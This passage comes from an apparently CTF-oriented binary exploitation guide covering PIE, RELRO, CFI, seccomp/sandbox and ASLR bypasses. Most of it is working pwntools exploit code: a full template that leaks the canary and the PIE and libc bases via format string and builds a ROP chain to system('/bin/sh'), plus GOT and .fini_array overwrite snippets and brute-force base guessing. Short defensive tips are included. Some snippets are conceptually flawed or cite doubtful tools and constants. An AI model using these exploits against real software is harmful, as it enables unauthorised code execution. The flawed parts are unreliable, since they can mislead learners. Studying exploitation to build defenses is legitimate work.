objdump -d -M intel --section=.plt ./binary

# PLT entries are at fixed offsets from base
# Example:
# 0x1030: puts@plt
# 0x1040: printf@plt
# 0x1050: system@plt

# If we leak any code address, calculate base:
# leaked_addr & ~0xfff = page_base
# Refine by knowing function offset
```

**Using PLT as ROP Gadgets:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_plt_gadgets'
elf = ELF(binary)

# Leak PIE base
# ... leak code ...
pie_base = 0x555555554000

# PLT entries can be used as gadgets
# PLT stub structure:
# jmp qword ptr [GOT_entry]
# push index
# jmp PLT[0]

# Sometimes contains useful partial gadgets
# Check with: objdump -d -M intel --section=.plt

# Example: Use PLT entries to chain calls
puts_plt = pie_base + elf.plt['puts']
printf_plt = pie_base + elf.plt['printf']
pop_rdi = pie_base + 0x1234

# Build chain
payload = b"A" * 120
payload += p64(pop_rdi)
payload += p64(pie_base + elf.got['puts'])
payload += p64(puts_plt)  # Leak libc
# Continue chain...
```

#### Technique 3: Binary Search for Base

**When Partial Overwrite Fails:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def test_base(base_guess):
    """Test if guessed base is correct"""
    try:
        p = process('./pie_binary', timeout=1)
        
        # Calculate target address
        win_addr = base_guess + 0x1234  # win() offset
        
        payload = b"A" * 120
        payload += p64(win_addr)
        
        p.sendline(payload)
        response = p.recvall(timeout=1)
        p.close()
        
        return b"flag" in response
    except:
        return False

# Binary search over possible base addresses
# Typical 64-bit PIE range: 0x555555554000 - 0x555555600000

lower = 0x555555554000
upper = 0x555555600000
page_size = 0x1000

while lower <= upper:
    mid = ((lower + upper) // 2) & ~(page_size - 1)  # Page-aligned
    
    if test_base(mid):
        log.success(f"Found base: {hex(mid)}")
        break
    
    # Try both directions
    if test_base(mid + page_size):
        log.success(f"Found base: {hex(mid + page_size)}")
        break
    
    # Adjust search (requires heuristic or more info)
    lower = mid + page_size
```

### Protection Combination Matrix

```
┌─────────┬────────┬──────┬──────┬─────────────────────────────┐
│ Canary  │   NX   │ ASLR │ PIE  │ Exploitation Strategy       │
├─────────┼────────┼──────┼──────┼─────────────────────────────┤
│   No    │   No   │  No  │  No  │ Direct shellcode injection  │
│   No    │  Yes   │  No  │  No  │ ret2libc/ROP (fixed addrs)  │
│   No    │  Yes   │ Yes  │  No  │ Leak libc, ROP              │
│   No    │  Yes   │ Yes  │ Yes  │ Leak PIE+libc, ROP          │
│  Yes    │   No   │  No  │  No  │ Leak canary, shellcode      │
│  Yes    │  Yes   │  No  │  No  │ Leak canary, ret2libc       │
│  Yes    │  Yes   │ Yes  │  No  │ Leak canary+libc, ROP       │
│  Yes    │  Yes   │ Yes  │ Yes  │ Leak canary+PIE+libc, ROP   │
└─────────┴────────┴──────┴──────┴─────────────────────────────┘
```

### Complete Exploit Template (All Protections)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Configuration
binary_path = './full_protection'
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'

elf = ELF(binary_path)
libc = ELF(libc_path)

# Connection
p = process(binary_path)
# p = remote('target.com', 1337)

# Stage 1: Leak canary, PIE base, and libc
log.info("Stage 1: Information gathering")

# Format string payload to leak all at once
# Adjust offsets based on stack analysis
payload = b"canary:%11$p pie:%15$p libc:%17$p"
p.sendline(payload)

response = p.recvline().decode()

# Parse leaks
canary_str = response.split("canary:")[1].split()[0]
pie_str = response.split("pie:")[1].split()[0]
libc_str = response.split("libc:")[1].split()[0]

canary = int(canary_str, 16)
pie_leak = int(pie_str, 16)
libc_leak = int(libc_str, 16)

# Calculate bases
pie_base = pie_leak - elf.symbols['main']  # Adjust offset
libc_base = libc_leak - libc.symbols['__libc_start_main'] - 231  # Adjust

log.success(f"Canary: {hex(canary)}")
log.success(f"PIE base: {hex(pie_base)}")
log.success(f"Libc base: {hex(libc_base)}")

# Stage 2: Calculate addresses
log.info("Stage 2: Calculating exploit addresses")

pop_rdi = pie_base + 0x1234  # Find with ROPgadget
ret = pie_base + 0x1235       # For stack alignment

system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"pop rdi @ {hex(pop_rdi)}")
log.info(f"system @ {hex(system)}")
log.info(f"/bin/sh @ {hex(bin_sh)}")

# Stage 3: Build ROP chain
log.info("Stage 3: Building ROP chain")

offset_to_canary = 72
offset_to_rip = 88

payload = b"A" * offset_to_canary
payload += p64(canary)           # Preserve canary
payload += b"B" * 8              # Saved RBP
payload += p64(ret)              # Stack alignment (if needed)
payload += p64(pop_rdi)          # Set RDI
payload += p64(bin_sh)           # RDI = "/bin/sh"
payload += p64(system)           # Call system(rdi)

# Stage 4: Send exploit
log.info("Stage 4: Sending exploit")
p.sendline(payload)

# Stage 5: Interact with shell
p.interactive()
```

### Defense Recommendations

**For Developers:**

```c
// 1. Enable all protections during compilation
// gcc -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2

// 2. Use safe functions
// Avoid: strcpy, strcat, sprintf, gets
// Use: strncpy, strncat, snprintf, fgets

// 3. Check bounds
void safe_copy(char *dst, const char *src, size_t dst_size) {
    if (strlen(src) >= dst_size) {
        // Handle error
        return;
    }
    strcpy(dst, src);
}

// 4. Use AddressSanitizer during development
// gcc -fsanitize=address -g source.c -o binary

// 5. Static analysis
// Use: cppcheck, clang-tidy, scan-build
```

**For System Administrators:**

```bash
# 1. Ensure ASLR is enabled
echo 2 > /proc/sys/kernel/randomize_va_space

# 2. Use SELinux or AppArmor
# Restrict what processes can do even after exploitation

# 3. Keep system updated
# Patched libraries reduce exploitation surface

# 4. Monitor for exploitation attempts
# Use tools like fail2ban, OSSEC

# 5. Limit core dumps
ulimit -c 0
```

This completes the Protection Mechanisms section covering stack canaries (SSP), non-executable stack (NX/DEP), ASLR, and PIE with comprehensive bypass techniques and practical exploitation strategies.

---

## RELRO (Partial/Full)

RELRO (Relocation Read-Only) prevents GOT (Global Offset Table) overwrites by marking relocated sections read-only after dynamic linking. Understanding RELRO levels is critical for exploitation strategy selection.

**RELRO mechanics**

Dynamic linking requires writable GOT for lazy binding:

```
Initial state (before RELRO):
.got.plt section (writable):
[printf entry]  -> Unresolved initially
[puts entry]    -> Unresolved initially
[system entry]  -> Unresolved initially
```

Linker resolves addresses at first call:

```asm
call printf@plt
; On first call, resolver looks up printf in libc
; Writes resolved address to GOT
; Subsequent calls jump directly to libc address
```

**No RELRO (vulnerable baseline)**

GOT remains writable throughout execution:

```bash
checksec --file=./binary
RELRO           : No
```

Exploitability:

```c
// GOT overwrite attack possible
void *got_printf = (void *)0x601018;
*(long *)got_printf = 0x400500;  // Overwrite with gadget address
printf("test");                  // Executes gadget instead
```

**Partial RELRO**

`.got.plt` remains writable, but `.got` (non-PLT relocations) becomes read-only:

```bash
checksec --file=./binary
RELRO           : Partial
```

Memory layout:

```
.got section (read-only):
[static_var_reloc]  <- Protected
[atexit_handler]    <- Protected

.got.plt section (writable):
[printf@plt]        <- Exploitable
[system@plt]        <- Exploitable
[exit@plt]          <- Exploitable
```

**Exploitation with Partial RELRO:**

Overwrite function pointers in GOT PLT:

```python
# Partial RELRO: .got.plt writable
got_system = 0x601018
shell_gadget = 0x400600

# Overwrite system@plt with gadget
write_primitive(got_system, shell_gadget)

# Next system() call executes gadget
system("/bin/sh")
```

**Full RELRO**

Both `.got` and `.got.plt` become read-only after dynamic linking:

```bash
checksec --file=./binary
RELRO           : Full
```

Executable:

```bash
readelf -l /path/to/binary | grep -E "GNU_RELRO|DYNAMIC"
```

Output shows:

```
Type           Offset             VirtAddr           PhysAddr
GNU_RELRO      0x002d80           0x0000000000202d80 0x0000000000202d80
DYNAMIC        0x002d80           0x0000000000202d80 0x0000000000202d80
```

**GOT protection verification:**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) x/10i 0x401000  ; Examine .text
(gdb) x/10x 0x601018  ; Examine .got.plt
; Try to write:
(gdb) set *(int *)0x601018 = 0xdeadbeef
; Fails: Cannot access memory at address 0x601018
```

**Partial RELRO bypass techniques**

**1. Info leak + ROP chain**

Instead of overwriting GOT:

```python
# Leak libc address via info disclosure
leaked_addr = leak_via_format_string()

# Calculate libc base and system address
libc_base = leaked_addr - known_offset
system_addr = libc_base + system_offset

# Build ROP chain calling system with calculated address
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(bin_sh_addr)
rop.raw(system_addr)  # Direct libc address, not GOT

payload = exploit_buffer + rop.chain()
```

**2. Function pointer overwrite (heap)**

Overwrite function pointers on heap instead of GOT:

```c
struct callback {
    void (*func)(void);
};

struct callback *cb = malloc(sizeof(struct callback));
cb->func = &safe_function;

// Exploit heap overflow
cb->func = &dangerous_function;

// Later:
cb->func();  // Executes dangerous_function
```

Exploitation:

```python
# Heap overflow overwrites function pointer
heap_overflow = b'A' * offset
heap_overflow += p64(gadget_addr)  # Overwrites cb->func

# Trigger callback
p.send(heap_overflow)
p.send(b'trigger')  # Causes cb->func() call
```

**3. Use atexit() handlers (Partial RELRO)**

`.fini_array` section contains function pointers called at exit:

```bash
objdump -s -j .fini_array /path/to/binary
```

Output:

```
Contents of section .fini_array:
 400e10 60064000 00000000 00000000 00000000
```

Address 0x400e10 contains function pointers (little-endian).

**Exploitation:**

```python
# Check if .fini_array writable (Partial RELRO)
fini_array_addr = 0x400e10

# Write gadget address
write_primitive(fini_array_addr, gadget_addr)

# At exit(), gadget executes
p.send(exit_trigger)
```

**4. Overwrite .init_array**

`.init_array` similar to `.fini_array`, called at program start:

```bash
objdump -s -j .init_array /path/to/binary
```

Less useful for exploitation since array already executed, but relevant if vulnerability occurs before initialization completes.

**Full RELRO bypass techniques**

**1. ROP gadget chains (no GOT needed)**

```python
rop = ROP(binary)
rop.call('system', [elf.search(b'/bin/sh').__next__()])

payload = overflow_buffer
payload += rop.chain()
```

Gadgets already in binary, addresses deterministic via partial ASLR or leaks.

**2. Direct libc function calls (address calculation)**

```python
# Leak any libc pointer
leaked_ptr = leak_via_format_string()

# Calculate system() address
system_offset_from_leak = libc_db.query(leaked_ptr)[0]
system_addr = leaked_ptr + system_offset_from_leak

# Call directly without GOT
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(bin_sh_addr)
rop.raw(system_addr)
```

**3. Mprotect() to make memory writable**

Change memory protections to enable writes:

```python
# mprotect(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC)
rop = ROP(binary)
rop.mprotect(0x601000, 0x1000, 7)  # Make GOT writable

# Now overwrite GOT
rop.raw(pop_rdi_gadget)
rop.raw(got_system_addr)
rop.raw(pop_rsi_gadget)
rop.raw(gadget_addr)
rop.raw(mov_rdi_rsi_gadget)  # Overwrite GOT

# Call system with modified GOT
rop.call('system', [elf.search(b'/bin/sh').__next__()])
```

**4. sigaction() to redirect signals**

Override signal handlers pointing to gadgets:

```python
# sigaction(SIGSEGV, &handler, NULL)
# Set handler to gadget address

rop = ROP(binary)
rop.call('sigaction', [SIGSEGV, gadget_addr, 0])

# Trigger signal (segfault), execute gadget
rop.raw(dereference_null_gadget)
```

**Detection and verification**

**Checksec:**

```bash
checksec --file=./binary
RELRO           : Full
```

**Readelf verification:**

```bash
readelf -l /path/to/binary | grep -E "GNU_RELRO|^[ ]*LOAD"
```

Output showing GNU_RELRO segment indicates RELRO enabled.

**GOT writability test (GDB):**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) x/10x 0x601018  ; Read GOT
(gdb) set *(int *)0x601018 = 0xffffffff
; If write succeeds: Partial RELRO
; If write fails: Full RELRO
```

**Disassembly inspection**

Partial RELRO binaries show PLT stubs with GOT lookups:

```bash
objdump -d /path/to/binary | grep -A 5 "printf@plt"
```

Output:

```
0000000000401050 <printf@plt>:
  401050:	ff 25 ea 2f 00 00    	jmp    QWORD PTR [rip+0x2fea]  ; GOT lookup
  401056:	68 00 00 00 00       	push   0x0
  40105b:	e9 e0 ff ff ff       	jmp    4010f0
```

Full RELRO shows similar PLT, but GOT entries become read-only after initialization.

**RELRO compilation flags**

Enable RELRO:

```bash
gcc -fPIE -fPIC -Wl,-z,relro -Wl,-z,now program.c -o program
```

Flags breakdown:

- `-fPIE`: Position Independent Executable
- `-fPIC`: Position Independent Code
- `-Wl,-z,relro`: Enable RELRO
- `-Wl,-z,now`: Full RELRO (all relocations resolved at startup)

Disable RELRO (testing):

```bash
gcc -Wl,-z,norelro program.c -o program
```

**Binary analysis tools**

**Radare2 RELRO analysis:**

```bash
r2 /path/to/binary
> i~relro          ; Show RELRO status
> is               ; List symbols
> is~got           ; Filter GOT symbols
```

**Capstone disassembly with GOT references:**

```python
from capstone import *

md = Cs(CS_ARCH_X86, CS_MODE_64)
md.detail = True

# Disassemble PLT
for insn in md.disasm(plt_code, plt_addr):
    if insn.operand_str.count('[rip') > 0:
        print(f"GOT reference: {insn.mnemonic} {insn.op_str}")
```

**Exploitation framework integration**

Pwntools RELRO handling:

```python
from pwn import *

elf = ELF('./binary')

# Check RELRO
if elf.relro == 'Full':
    print("Full RELRO - use ROP chains")
    rop = ROP(elf)
elif elf.relro == 'Partial':
    print("Partial RELRO - GOT overwrite possible")
    # Use GOT overwrite
else:
    print("No RELRO - GOT freely writable")
    # Use direct GOT overwrite
```

---

## Control Flow Integrity (CFI)

Control Flow Integrity (CFI) prevents arbitrary code execution by validating control flow destinations against a compiled whitelist. Implementations range from coarse-grained (basic CFI) to fine-grained (full CFI), with varying bypass complexity.

**CFI principles**

Valid control flow graph (CFG) computed at compile time:

```
Function A can call:
  - Function B (line 10)
  - Function C (line 20)
  - Libc system() (line 30)

Invalid: Function A calling arbitrary address
```

CFI instruments code to verify destinations match CFG:

```asm
; Original: call rax
; Instrumented:
lea rcx, [rel valid_targets]
cmp rax, [rcx]
cmp rax, [rcx+8]
cmp rax, [rcx+16]
je .valid
; CFI violation
ud2          ; Undefined instruction, crash
.valid:
call rax
```

**Checksec CFI detection:**

```bash
checksec --file=./binary
Clang CFI        : Yes        # CFI enabled
Control Flow Guard: No         # Windows CFI (not enabled)
```

**CFI implementation types**

**1. Coarse-grained CFI (vulnerable)**

Only validates function call destinations globally:

```c
// All function pointers must point to function start
typedef void (*func_t)(void);
func_t fp = &function;

// CFI checks: is fp a function start?
// Yes -> allowed (even if wrong function)
fp();
```

Bypass: Point to any function, execute arbitrary code if function has useful gadgets.

**2. Medium-grained CFI**

Groups functions by signature (argument count, return type):

```c
typedef void (*func_t)(int);    // Expects 1 argument

// CFI checks: does fp accept 1 argument?
// Yes -> allowed
fp(arg);
```

Bypass: Find function with matching signature performing useful operation.

**3. Fine-grained CFI**

Precise control flow enforcement, each indirect call has specific valid targets:

```c
// At line 10: only B or C valid
// At line 20: only C or D valid

// CFI validates exact location matches target
```

Bypass: Extremely difficult, requires chaining valid targets.

**Indirect call instrumentation**

CFI protection transforms indirect calls:

```asm
; Unprotected:
call rax

; Protected (example):
movzx ecx, byte [rip + __cfi_check]
cmp rcx, [rdi]              ; Validate against CFI table
jne .cfi_fail
call rax
```

**Disassembly inspection:**

```bash
objdump -d /path/to/binary | grep -B 5 "call.*rax\|call.*rdi"
```

Look for CMP/JNE patterns before calls, indicating CFI checks.

**CFI table extraction (Clang CFI):**

Clang stores CFI metadata in `.text` section:

```bash
strings /path/to/binary | grep -E "cfi|check"
```

Radare2 CFI analysis:

```bash
r2 /path/to/binary
> aaa
> pdf @ suspicious_function
```

Look for validation patterns before indirect calls.

**CFI bypass techniques**

**1. ROP without indirect calls**

Avoid indirect calls entirely, use only direct calls and ret instructions:

```python
# Instead of: call rax (indirect)
# Use: call 0x401000 (direct)

rop = ROP(binary)
# Chain only direct calls
rop.call('system', [elf.search(b'/bin/sh').__next__()])
```

Direct calls bypass CFI since destinations are fixed at compile time.

**2. Direct function calls (no CFI check)**

Call functions through their PLT addresses (direct):

```python
# Direct call to system@plt
system_plt = 0x401050

rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(bin_sh_addr)
rop.raw(system_plt)  # Direct call, no CFI check
```

**3. Return statement reuse**

`ret` instructions not protected by CFI:

```asm
function_a:
    ...
    ret          ; Pops RIP from stack, returns to caller

; CFI typically allows this
```

Exploit: Place return address on stack, function executes `ret`, no CFI check.

**4. Existing function calls (gadget reuse)**

Functions already performing useful operations:

```c
void safe_function(char *cmd) {
    system(cmd);  // Already contains system() call
}

// CFI allows calling safe_function (valid call)
// Inside, system() executes
```

Bypass: Find function performing useful operation, call it instead of arbitrary gadget.

**5. Signal handler exploitation**

Signal handlers not protected by standard CFI:

```c
void sig_handler(int sig) {
    // Signal handler code
    // CFI checks may not apply
}

signal(SIGUSR1, arbitrary_handler);  // Overwrites handler
raise(SIGUSR1);                       // Calls handler
```

**6. Destructor/Constructor chaining**

C++ object destructors called during stack unwinding:

```c++
class Exploit {
public:
    ~Exploit() {
        system("/bin/sh");  // Destructor
    }
};

Exploit obj;
// obj destroyed at scope exit, destructor called
```

Exploit: Trigger object destruction through exception handling, destructor executes.

**7. Longjmp/setjmp bypass**

Longjmp restores execution state without CFI checks:

```c
jmp_buf buf;
setjmp(buf);           // Save state

// Modify buf to point to gadget
buf->rip = gadget_addr;

longjmp(buf, 1);       // Restore corrupted state, no CFI check
```

**8. Forward-edge attack (partial CFI)**

CFI enforces backward edges (returns) but not forward edges (calls):

[Inference] Some CFI implementations check return addresses (backward edges) but not call destinations (forward edges), enabling forward-edge attacks through indirect calls.

**9. Information leak + direct call**

Leak function addresses, use direct calls:

```python
# Leak libc base
leaked = leak_pointer()
libc_base = calculate_base(leaked)

# Calculate system address
system_addr = libc_base + system_offset

# Direct jmp/call (no CFI on direct instructions)
rop = ROP(binary)
rop.raw(system_addr)
```

**10. Timing side-channel (theoretical)**

[Unverified] Detect CFI violations through timing variations:

```python
# CFI check slower than regular execution
times = []
for attempt in range(100):
    start = time.time()
    trigger_indirect_call(target)
    elapsed = time.time() - start
    times.append(elapsed)

# Analyze distribution for CFI check overhead
```

Modern CPUs with speculative execution complicate timing attacks.

**CFI detection via crashes**

Invalid CFI targets cause crashes:

```python
# Try calling gadget address
p.send(payload_with_invalid_call)

try:
    p.recv(timeout=1)
except:
    print("CFI violation crash detected")
```

GDB inspection:

```bash
gdb ./binary
(gdb) run payload
; Program crashes at CFI check
(gdb) x/i $rip
0x401234: cmp rcx, [rdi]
```

**CFI bypass tools**

**Google CFI analysis:**

```bash
cfi_check /path/to/binary
```

Analyzes CFI instrumentation, identifies bypass possibilities.

**Radare2 CFI visualization:**

```bash
r2 /path/to/binary
> agf         ; Graph functions
> agd         ; Graph data flow
```

Shows indirect call targets, helps identify valid call destinations.

**Pwntools CFI awareness:**

```python
from pwn import *

elf = ELF('./binary')

# Check for CFI
cfi_protected = b'cfi' in elf.get_section_data('.text')

if cfi_protected:
    print("CFI detected - use direct calls only")
else:
    print("No CFI - indirect calls exploitable")
```

**Clang CFI-specific bypasses**

Clang implements `-fsanitize=cfi` with specific bypass patterns:

**Abort on CFI failure (easier bypass):**

```
-fsanitize=cfi-vcall (virtual call checks)
Only prevents virtual calls, direct calls pass through
```

**Return value poisoning (harder bypass):**

```
-fsanitize=cfi-nvcall (non-virtual calls)
Enforces all indirect calls
```

**Hybrid approach:**

```python
# Use direct calls where possible
rop = ROP(binary)
rop.call('system', [...])

# For indirect calls, use existing functions
rop.raw(function_pointer_a)  # Already in CFI whitelist
```

**Real-world CFI examples**

Microsoft Control Flow Guard (CFG):

```bash
checksec --file=./binary.exe
Control Flow Guard: Yes
```

CFG on Windows, similar principles but different implementation.

Chrome's RenderProcess CFI:

Google implemented CFI in Chrome V8 engine, preventing JIT exploitation but adding overhead.

---

## Seccomp and Sandboxing

Seccomp (secure computing mode) restricts syscalls available to process, limiting damage from compromised code. Understanding seccomp filters enables exploitation targeting allowed syscalls or exploiting sandbox escapes.

**Seccomp principles**

Seccomp allows/denies syscalls based on compiled filter:

```
Allowed syscalls:
- read
- write
- exit

Denied syscalls:
- execve (no shell spawning)
- clone (no forking)
- mmap (no new memory)
```

Denied syscalls return -1 (EPERM) or crash process (SIGSYS).

**Seccomp detection**

Check process capabilities:

```bash
cat /proc/[pid]/status | grep Seccomp
```

Output:

```
Seccomp:	1       # Seccomp filter installed
Seccomp_filters: 2  # Number of filters
```

**Checksec seccomp detection:**

```bash
checksec --file=./binary
```

May show if seccomp is used, but not definitive.

**Runtime seccomp detection:**

```bash
strace -f ./binary 2>&1 | grep -E "seccomp|ENOSYS"
```

Shows denied syscalls.

**Seccomp filter types**

**1. SECCOMP_MODE_STRICT**

Only `read`, `write`, `exit`, `sigreturn` allowed:

```c
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
```

Highly restrictive, rarely used.

**2. SECCOMP_MODE_FILTER**

Custom BPF filters define allowed syscalls:

```c
struct sock_filter filter[] = {
    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0),
    BPF_JUMP(BPF_JEQ + BPF_K, SYS_read, 1, 0),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_DENY),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
};

prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filter);
```

**Seccomp filter extraction**

Dump seccomp filter from running process:

```bash
cat /proc/[pid]/seccomp
```

Rarely shows filter details, but indicates seccomp presence.

**Libseccomp library usage:**

Check binary for libseccomp:

```bash
ldd ./binary | grep seccomp
	libseccomp.so.2 => /usr/lib/libseccomp.so.2
```

Indicates libseccomp usage, filter likely complex.

**strings extraction:**

```bash
strings ./binary | grep -E "seccomp|EPERM|ENOSYS"
```

May reveal filter hints.

**Seccomp bypass techniques**

**1. Use allowed syscalls**

Exploit goals achievable with allowed syscalls only:

```python
# Seccomp allows: read, write, exit, open, close

# Goal: Read flag file
open_syscall(flag_file, O_RDONLY)  # Allowed
read_syscall(fd, buf, size)        # Allowed
write_syscall(1, buf, size)        # Allowed (write to stdout)
exit_syscall(0)                    # Allowed
```

**2. Read via allowed I/O**

If `read` allowed, leak file contents:

```python
# Read flag
fd = open('/flag', O_RDONLY)
flag = read(fd, 1024)
write(1, flag, len(flag))  # Output to stdout
```

Exploitation:

```bash
./binary 2>&1 | grep "flag{"
```

**3. Write via allowed I/O**

If `write` allowed, create backdoor:

```python
# Write shellcode to /tmp
fd = open('/tmp/backdoor', O_WRONLY | O_CREAT)
write(fd, shellcode, len(shellcode))
close(fd)

# Later execution (if allowed):
execve('/tmp/backdoor', ...)
```

**4. Information leak via side-channels**

Timing or resource consumption measurement:

```python
# Timing-based leak (cache side-channels)
start = time()
access_protected_memory()
elapsed = time() - start

if elapsed > threshold:
    leaked_bit = 1
else:
    leaked_bit = 0
```

[Inference] Seccomp doesn't prevent side-channel attacks based on timing or resource usage, only syscall restrictions.

**5. Ptrace sandboxing bypass**

If `ptrace` allowed:

```c
ptrace(PTRACE_ATTACH, victim_pid);
ptrace(PTRACE_POKETEXT, victim_pid, address, value);
ptrace(PTRACE_DETACH, victim_pid);
```

Modify victim process memory, change seccomp rules or inject code.

**6. Memory corruption within allowed syscalls**

Exploit memory bugs to corrupt seccomp filter:

```python
# Buffer overflow in filter processing
# Corrupt filter array to allow previously-denied syscalls
```

[Unverified] Direct filter corruption extremely rare; kernel validates filter integrity.

**7. Signal handler exploitation**

Signals bypass some seccomp restrictions:

```c
signal(SIGSEGV, custom_handler);
// Trigger segfault
*(int *)0 = 0;
// custom_handler executes, potentially outside seccomp scope
```

[Unverified] Modern kernels apply seccomp to signal handlers; bypass unreliable.

**8. Seccomp architecture bypass**

x86-32 vs x86-64 syscall numbers differ:

```
x86-64 SYS_execve = 59
x86-32 SYS_execve = 11

If filter only blocks x86-64:
```

Exploit through 32-bit compatibility layer (if available).

**9. KVM/virtualization escape**

Seccomp in guest VM, escape to host:

```python
# Hypervisor privilege escalation
# (Extremely advanced, requires VM vulnerability)
```

[Unverified] Requires 0-day VM escape, impractical in CTF.

**10. File descriptor manipulation**

Use inherited file descriptors to bypass I/O restrictions:

```python
# Parent process opens file descriptor
# Child inherits via fork
# Child can use inherited fd without `open` syscall
```

Exploitation:

```bash
# Parent opens file, passes to child
exec 3< /flag
./binary 3
# Child reads via fd 3
```

**Seccomp policy analysis**

**seccomp-tools (Ruby library):**

```bash
gem install seccomp-tools
seccomp-tools dump ./binary
```

Output:

```
 line  CODE  JT   JF      K
=================================
 0000  0x20 0x00 0x00 0x00000004  A = arch
 0001  0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002  0x20 0x00 0x00 0x00000000  A = syscall_number
 0003  0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004  0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005  0x15 0x01 0x00 0x00000000  if (A == 0) goto 0007 ; SYS_read
 0006  0x15 0x01 0x00 0x00000001  if (A == 1) goto 0008 ; SYS_write
 0007  0x15 0x01 0x00 0x0000003c  if (A == 60) goto 0009 ; SYS_exit
 0008  0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009  0x06 0x00 0x00 0x00000000  return DENY
```

**Interpretation:**

- Lines 0-2: Architecture check (x86-64 only)
- Lines 5-7: Syscalls 0 (read), 1 (write), 60 (exit) allowed
- Line 8: Return ALLOW for matching syscalls
- Line 9: Return DENY for others

**Exploitation strategy:**

Only `read`, `write`, `exit` allowed:

```python
# Read flag via read syscall
fd = syscall(2, '/flag', 0)  # open (not allowed, but try)
# EPERM returned, fd = -1

# Instead, use inherited fd or file passed as argument
```

**Strace with seccomp:**

```bash
strace -e seccomp ./binary
```

Shows seccomp events and denied syscalls.

**Sandboxing mechanisms**

**Namespace isolation:**

```bash
unshare --pid --net --ipc -- ./binary
```

Creates isolated namespace, restrictions beyond seccomp:

- PID namespace: Isolated process tree
- Network namespace: Isolated network stack
- IPC namespace: Isolated inter-process communication

**Escape techniques:**

1. Privilege escalation (get `CAP_SYS_ADMIN`)
2. Capability leak
3. Namespace reference manipulation

**cgroup restrictions:**

```bash
cgcreate -g memory,cpu:/sandbox
cgset -r memory.limit_in_bytes=100M /sandbox
cgexec -g memory,cpu:/sandbox ./binary
```

Restricts memory and CPU usage. Bypass:

- OOM killer exploitation
- Resource limit exhaustion

**Chroot isolation:**

```bash
chroot /jail ./binary
```

Restricts filesystem access. Escape:

- File descriptor reference to parent directory
- Privilege escalation
- Chroot design flaws

**Seccomp + Namespace combination (Docker-like):**

```bash
docker run --security-opt seccomp=default ./binary
```

Combines multiple restrictions. Escape requires:

1. Seccomp bypass
2. Namespace escape
3. Privilege escalation

**Real-world sandboxing examples**

**Chrome V8 sandbox:**

Combination of seccomp, namespaces, capabilities:

```bash
# V8 runs with severe restrictions
# Only specific syscalls allowed
# Namespace isolation prevents cross-process attacks
```

**QEMU seccomp filter:**

QEMU applies seccomp to guest VMs:

```bash
qemu-system-x86_64 -sandbox on
```

Restricts QEMU syscalls, not guest.

**Chromium PPAPI (Pepper Plugin API):**

Plugins run in sandbox with tight seccomp restrictions.

**Detection and analysis**

**Seccomp violations:**

Denied syscalls cause:

```
Killed by SIGSYS: killed by seccomp violation
```

GDB catches violation:

```bash
gdb ./binary
(gdb) run
; Program crashes on denied syscall
(gdb) x/i $rip
; Instruction causing violation
```

**Sandbox detection tools:**

```bash
# Check for seccomp
cat /proc/self/status | grep Seccomp

# Check for namespaces
ls -la /proc/self/ns/

# Check for cgroups
cat /proc/self/cgroup
```

**Exploitation framework support**

Pwntools sandbox detection:

```python
from pwn import *

context.os = 'linux'
p = process('./binary')

# Try syscall
try:
    result = syscall(1, 1, b'test', 4)  # write syscall
except:
    print("Sandboxing detected")
```

---

**Related protection mechanism subtopics essential for comprehensive bypass:** Address Space Layout Randomization (ASLR) defeating through pointer leaks and information disclosure, Shadow Stack/Indirect Branch Tracking (Intel CET) enforcement and return address validation, and Hardware-based protections (PAC on ARM, MTE memory tagging) enabling fine-grained integrity verification.

---

## ASLR (Address Space Layout Randomization)

ASLR randomizes memory layout across executions, preventing predictable address-based exploitation. Understanding ASLR levels and bypass techniques is critical for reliable exploit development.

**ASLR mechanisms**

Kernel randomizes memory regions:

```
Execution 1:
  Binary base: 0x400000
  Heap start: 0x602000
  Stack base: 0x7ffffffde000
  Libc base: 0x7ffff7d00000

Execution 2:
  Binary base: 0x555555554000 (different)
  Heap start: 0x555555776000 (different)
  Stack base: 0x7fffffffde00 (different)
  Libc base: 0x7ffff7d7f000 (different)
```

**ASLR levels (Linux)**

Check system ASLR:

```bash
cat /proc/sys/kernel/randomize_va_space
```

Values:

- `0`: ASLR disabled (all addresses predictable)
- `1`: Partial ASLR (some regions randomized, lower bits fixed)
- `2`: Full ASLR (all regions fully randomized)

**Disable ASLR for testing:**

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Re-enable:

```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Per-process ASLR control:**

```bash
setarch x86_64 -R ./binary    # Disable ASLR for this process
```

**ASLR bypass technique 1: Information leak**

Leak pointer from memory, calculate base addresses:

```python
# Format string leak
leaked_libc_addr = leak_via_format_string()

# Calculate libc base (0x1000 alignment typical)
libc_base = leaked_libc_addr & ~0xfff
system_addr = libc_base + 0x50000  # system() offset
```

**Precision leak:**

Leak multiple pointers to refine base calculation:

```python
# Leak at multiple offsets
for offset in range(0, 0x100, 8):
    leaked = read_via_format_string(offset)
    potential_bases.append(leaked & ~0xfff)

# Find consistent base across leaks
common_base = max(set(potential_bases), key=potential_bases.count)
```

**Leak via buffer overflow:**

```python
# Overflow into saved registers containing addresses
offset = 40
payload = b'A' * offset

# Read back what we overflowed (if possible)
response = p.recv(1024)
leaked_addr = parse_response(response)
```

